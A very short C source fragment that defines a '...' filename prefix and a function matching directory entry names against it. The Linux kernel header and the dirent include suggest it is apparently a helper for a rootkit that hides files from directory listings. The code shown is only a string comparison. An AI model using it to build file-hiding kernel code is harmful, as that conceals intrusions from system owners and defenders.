#include <linux/string.h>

#include "dirent.h"

#define HIDDEN_PREFIX "..."

int prefix_match(char* d_name) { return memcmp(HIDDEN_PREFIX, d_name, strlen(HIDDEN_PREFIX)) == 0; }
